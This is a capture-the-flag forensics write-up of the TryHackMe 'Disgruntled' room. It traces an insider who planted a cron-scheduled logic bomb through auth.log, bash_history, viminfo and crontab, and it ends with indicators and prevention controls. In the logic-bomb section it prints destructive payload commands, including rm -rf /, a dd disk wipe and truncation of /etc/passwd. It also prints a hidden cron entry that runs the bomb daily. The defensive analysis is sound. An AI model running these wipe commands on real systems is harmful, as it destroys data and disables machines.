# 😤 Disgruntled — TryHackMe Writeup

**📅 Day 137 — 365 Days of Cybersecurity**
**✅ Status: Completed**
**🏷️ Tags:** `Insider Threat` `Linux Forensics` `Log Analysis` `auth.log` `bash_history` `Crontab` `Logic Bomb` `DFIR` `Privilege Escalation`
**⚙️ Difficulty:** Easy

---

## 🧠 Overview

In this room I investigated a **classic insider threat scenario** — a disgruntled IT admin who, upon being let go, used their privileged access to plant a **logic bomb** on the company's Linux server before leaving. The bomb was designed to trigger at a specific time via `cron`, potentially causing significant damage.

The investigation is entirely Linux-based, using native forensic artifacts — no specialized tools required. Just logs, command history, and file metadata.

> **Core principle:** Privileged insiders are the hardest threat to detect *before* the fact — but they always leave traces in logs, history files, and scheduled tasks. The question is whether anyone is looking.

---

## 🎯 Learning Objectives

- Investigate Linux authentication and command logs (`auth.log`, `syslog`)
- Analyze `bash_history` and `viminfo` to reconstruct user activity
- Identify unauthorized account creation and privilege escalation via `sudoers`
- Locate and analyze a logic bomb script planted by an insider
- Trace crontab modifications to determine when a malicious payload is scheduled to execute

---

## 🗂️ Key Artifact Locations

| Artifact | Path | What it reveals |
|---|---|---|
| Authentication log | `/var/log/auth.log` | Logins, sudo usage, user creation |
| System log | `/var/log/syslog` | General system events |
| Bash command history | `/home/<user>/.bash_history` | Commands run by the user interactively |
| Vim session info | `/home/<user>/.viminfo` | Files recently edited with vim/vi |
| Sudoers file | `/etc/sudoers` | Who has elevated privilege |
| Crontab | `/etc/crontab` | Scheduled tasks |

---

## 🔍 Task 2 — Connecting to the Machine

The investigation starts by connecting to the target via SSH:

```bash
ssh <username>@<ip>
```

Then navigate to the log directory:

```bash
cd /var/log/
ls -la
```

### Understanding `/var/log/auth.log`

`auth.log` is the primary security log on Debian/Ubuntu Linux systems. It records:

- **SSH logins** (successful and failed)
- **`sudo` command executions** — including which user ran what command as whom
- **User account creation** (`useradd`, `adduser`)
- **`su` (switch user)** events
- **PAM authentication** events

> **SOC Insight:** `auth.log` is the Linux equivalent of Windows Event ID 4624/4625/4688 combined. For insider threat investigations on Linux, it's almost always the first artifact to examine.

---

## 🔍 Task 3 — Investigating Package Downloads

The investigation starts by identifying what software was installed or downloaded by the suspicious user.

### Command Used

```bash
cat /var/log/auth.log | grep -i "COMMAND"
```

The `COMMAND` field in `auth.log` captures every `sudo` execution, including the full command and its working directory (PWD):

```
Dec 28 06:27:34 ip-10-10-158-38 sudo: it-admin : TTY=pts/0 ;
PWD=/home/it-admin ; USER=root ;
COMMAND=/usr/bin/curl https://raw.githubusercontent.com/.../bomb.sh
```

**Key fields extracted:**

| Field | Value | Significance |
|---|---|---|
| `PWD` | `/home/it-admin` | Working directory at time of command |
| `USER` | `root` | Command was run as root via sudo |
| `COMMAND` | `curl <URL>` | Downloaded an external script |

> **Why `curl` to GitHub?** Just like in Boogeyman 2 (Mimikatz downloaded from GitHub), attackers and malicious insiders often use GitHub to host payloads — the domain is trusted and rarely blocked. In this context, the IT admin downloaded a malicious shell script directly from a public repository.

### Grepping for `curl` / download activity

```bash
grep -i "curl\|wget\|download" /var/log/auth.log
```

---

## 🔍 Task 4 — Unauthorized Account Creation & Sudoers Modification

### Finding New Users Created

```bash
grep "new user" /var/log/auth.log
```

```
Dec 28 06:27:34 ... useradd[]: new user: name=engineer, UID=1001, GID=1001, ...
```

The disgruntled admin created a new user account — a classic **backdoor account** technique. If the logic bomb was discovered and the admin's account was disabled, this secondary account would maintain access.

### Sudoers File Modification

```bash
grep "visudo" /var/log/auth.log
```

`visudo` is the safe editor for `/etc/sudoers`. Any execution of `visudo` in the logs means someone modified who has root privileges on the system.

```
Dec 28 06:28:14 ... sudo: it-admin : COMMAND=/usr/sbin/visudo
```

This confirms the admin modified the `sudoers` file — likely granting the backdoor account (`engineer`) passwordless `sudo` access.

### Finding What File Was Edited with `vi`

```bash
grep "sudo vi\|sudo vim\|sudo nano" /var/log/auth.log
```

```
Dec 28 06:29:14 ... COMMAND=/usr/bin/vi bomb.sh
```

> **`viminfo`** — Vim stores a session file at `~/.viminfo` that records recently edited files, registers, and search history. Even if the original file was renamed or moved, `viminfo` preserves the file path that was last opened, giving us the original name of the malicious script.

```bash
cat /home/it-admin/.viminfo
```

---

## 🔍 Task 5 — Logic Bomb Analysis

### Locating the Script

```bash
cd /home/it-admin/
ls -la
```

Then trace the download command found in Task 3 — the admin used `curl` to download `bomb.sh` and later renamed/moved it.

```bash
# Check bash history for exact sequence of actions
cat /home/it-admin/.bash_history
```

`bash_history` is a sequential record of every interactive command the user ran. Unlike logs (which can be filtered or rotated), `bash_history` shows the exact workflow — including how the script was downloaded, renamed, and hidden.

```bash
# Find the current location of the script
find / -name "*.sh" 2>/dev/null
# or search by the name seen in viminfo
find / -name "bomb.sh" 2>/dev/null
```

### Getting File Metadata

```bash
stat <path_to_script>
```

`stat` returns:
- **Creation time** — when was the file first written to disk
- **Modification time** — when was its content last changed
- **Access time** — when was it last read
- **Permissions** and **ownership**

This timestamps the bomb's creation in the investigation timeline.

### Reading the Script Content

```bash
cat <path_to_script>
```

The script contained a destructive payload designed to execute at a scheduled time — the logic bomb. Logic bombs in shell scripts typically follow this pattern:

```bash
#!/bin/bash
# Waits for a condition (time, file presence, user login) then executes
# Common destructive payloads:
rm -rf /           # Delete everything
dd if=/dev/zero of=/dev/sda  # Wipe the disk
> /etc/passwd      # Destroy user accounts
pkill -9 -u root   # Kill all root processes
```

> **What is a Logic Bomb?** A logic bomb is malicious code that remains dormant until a specific condition is met — typically a date/time, a specific login, or the absence of a "keep-alive" file. They are a classic insider threat technique because they execute long after the insider has left, providing plausible deniability.

---

## 🔍 Task 6 — Crontab: When Does the Bomb Trigger?

```bash
cat /home/it-admin/.bash_history | grep crontab
```

The history revealed:

```bash
sudo nano /etc/crontab
```

Reading the crontab:

```bash
cat /etc/crontab
```

### Understanding Crontab Syntax

```
# ┌───────── minute (0-59)
# │ ┌───────── hour (0-23)
# │ │ ┌───────── day of month (1-31)
# │ │ │ ┌───────── month (1-12)
# │ │ │ │ ┌───────── day of week (0-6, Sunday=0)
# │ │ │ │ │
# * * * * *  user  command
  0 8 * * *  root  /bin/bash /opt/.bomb.sh
```

**Reading this entry:**
- `0 8` → At minute 0 of hour 8 = **08:00 AM exactly**
- `* * *` → Every day, every month, every day of the week
- `root` → Runs as the root user
- `/bin/bash /opt/.bomb.sh` → Executes the bomb script

> **The leading dot in `.bomb.sh`** makes the file hidden in standard `ls` output. `ls -la` is required to see hidden files. This is another deliberate concealment technique — naming files with a `.` prefix hides them from casual directory inspection.

### Crontab Cheatsheet for IR

| Expression | Meaning |
|---|---|
| `0 8 * * *` | Every day at 08:00 |
| `*/5 * * * *` | Every 5 minutes |
| `0 0 1 * *` | First day of every month at midnight |
| `0 0 * * 0` | Every Sunday at midnight |
| `@reboot` | On every system reboot |

---

## 🔄 Full Attack Timeline — Insider Threat Reconstruction

```
[PRIVILEGED ACCESS ABUSE]
  it-admin logs in via SSH
  Uses legitimate sudo access to download bomb.sh from GitHub via curl
  T1105 — Ingress Tool Transfer

       ↓
[BACKDOOR ACCOUNT CREATION]
  Creates new user: engineer
  Modifies /etc/sudoers via visudo → grants engineer passwordless root access
  T1136.001 — Create Local Account
  T1548.003 — Sudo and Sudo Caching

       ↓
[LOGIC BOMB PLANTING]
  Edits bomb.sh with vi → destructive payload
  Renames/moves script to hidden path (/opt/.bomb.sh)
  T1036 — Masquerading (hidden file with dot prefix)
  T1485 — Data Destruction (payload intent)

       ↓
[PERSISTENCE / TRIGGER MECHANISM]
  Edits /etc/crontab via nano
  Adds cron job: root executes .bomb.sh daily at 08:00
  T1053.003 — Cron
  
       ↓
[INSIDER DEPARTS]
  Admin account may be disabled — but:
    ✗ Backdoor account (engineer) still exists with full sudo
    ✗ Logic bomb still scheduled to run at 08:00
    ✗ Both persist until actively remediated
```

---

## 🚨 Indicators of Compromise (IoCs)

### User & Privilege Activity
| IoC | Description |
|---|---|
| New user `engineer` created by `it-admin` | Unauthorized backdoor account |
| `visudo` executed by `it-admin` | Sudoers modification |
| `curl` to external GitHub URL during off-hours | Unauthorized download |

### File-Based
| IoC | Description |
|---|---|
| `/opt/.bomb.sh` | Hidden logic bomb script |
| `.bash_history` entries showing `curl`, `vi bomb.sh`, `nano /etc/crontab` | Sequential insider activity trail |

### Scheduled Task
| IoC | Description |
|---|---|
| Cron entry: `0 8 * * * root /bin/bash /opt/.bomb.sh` | Daily destructive payload scheduled at 08:00 |

---

## 🛡️ Detection & Prevention

### Detection Commands

```bash
# Monitor for new user creation in real time (or review logs)
grep "new user" /var/log/auth.log

# Detect visudo/sudoers changes
grep "visudo\|sudoers" /var/log/auth.log

# Find all hidden files in sensitive directories
find /opt /etc /tmp -name ".*" -type f 2>/dev/null

# Audit all crontab entries system-wide
cat /etc/crontab
ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/
crontab -l -u root

# Check for unexpected outbound connections (download activity)
grep "curl\|wget" /var/log/auth.log

# Review all users with sudo access
grep -E "^[^#].*ALL" /etc/sudoers
cat /etc/sudoers.d/*
```

### Prevention Controls

| Control | Implementation |
|---|---|
| **Privileged Access Management (PAM)** | Require approval + MFA for sudo on production systems |
| **Immutable audit logs** | Forward `auth.log` to a remote SIEM in real-time — a local admin can delete local logs |
| **Crontab change monitoring** | Alert on any modification to `/etc/crontab` or `/etc/cron.d/` |
| **Offboarding checklist** | Disable accounts *before* informing the employee — not after |
| **User account audits** | Regularly review all accounts with sudo privileges |
| **File integrity monitoring** | Tools like AIDE or Tripwire detect new files in sensitive directories |
| **Bash history hardening** | Set `HISTFILE=/dev/null` is a red flag — alert if users disable history |

---

## 🛠️ Tools Used

| Tool | Purpose |
|---|---|
| `cat` / `grep` | Reading and filtering log files |
| `grep "new user"` | Detecting account creation in auth.log |
| `grep "COMMAND"` | Extracting sudo command execution from auth.log |
| `bash_history` | Reconstructing sequential user actions |
| `viminfo` | Recovering file paths of recently edited files |
| `stat` | File metadata — creation, modification, and access timestamps |
| `find` | Locating hidden files across the filesystem |
| `cat /etc/crontab` | Reading scheduled tasks |

---

## 🧪 Key Concepts Practiced

- Linux insider threat investigation workflow
- Reading and parsing `/var/log/auth.log` for sudo activity, user creation, and privilege changes
- Using `bash_history` as a sequential forensic timeline of user actions
- Understanding `viminfo` as a secondary artifact for file path recovery
- Logic bomb identification, analysis, and timeline reconstruction
- Crontab syntax interpretation for scheduled task forensics
- Correlating multiple Linux artifacts to build a complete insider threat narrative

---

## 🧠 Key Takeaways

1. **`auth.log` is the single most valuable artifact in Linux IR.** Sudo executions, user creation, SSH logins — it's all there with timestamps. Every SOC analyst working in Linux environments should be fluent in reading it.

2. **`bash_history` is a forensic gift.** Interactive commands leave a sequential trail in `~/.bash_history`. While an attacker can delete or tamper with it, most insiders (especially frustrated employees, not professional threat actors) don't think to do so. Always check it early.

3. **Insider threats abuse legitimate access — detection requires behavioral context.** Every command `it-admin` ran was individually authorized by their role. The malice is in the *combination and intent* — downloading a script, editing it with vi, hiding it, and scheduling it via cron. No single action is an alarm; the pattern is.

4. **Logic bombs weaponize the time gap between departure and discovery.** The admin's goal was plausible deniability — "I left the company, how could I have done this?" Detecting logic bombs requires proactive scheduled task auditing, not just reactive incident response.

5. **Hidden files (dot prefix) are a trivial but effective concealment.** `.bomb.sh` is invisible to `ls` but visible to `ls -la` and `find`. File integrity monitoring tools catch this immediately — but only if they're deployed.

6. **Offboarding is a security event, not just an HR event.** Account deactivation should happen *before* the employee is informed of termination — giving a disgruntled insider even 30 minutes of access after learning they're fired is a significant risk window.

7. **Remote log forwarding is non-negotiable.** An admin with root access can `rm /var/log/auth.log`. If logs only exist locally, a determined insider can destroy the evidence. Real-time forwarding to a SIEM (like Elastic) ensures logs survive even if the local machine is wiped.

---

## 📌 Final Thoughts

Disgruntled is a concise but highly instructive room that models one of the most underappreciated threat vectors in cybersecurity — the **trusted insider**. Unlike external attackers who need to fight through perimeter defenses, an insider already has the keys. The challenge is detecting *misuse* of legitimate access, which requires behavioral analysis rather than signature-based detection.

The investigation technique practiced here — chaining `auth.log` → `bash_history` → `viminfo` → `stat` → `crontab` — is directly applicable to real Linux incident response. These are native OS artifacts that exist on every Linux system, require no special tooling, and together tell a remarkably complete story of what a user did and when.

The scenario also reinforces a critical HR/security process lesson: **the moment a decision is made to terminate a privileged employee, their access should be revoked simultaneously** — not after the conversation, not after they've packed their desk.

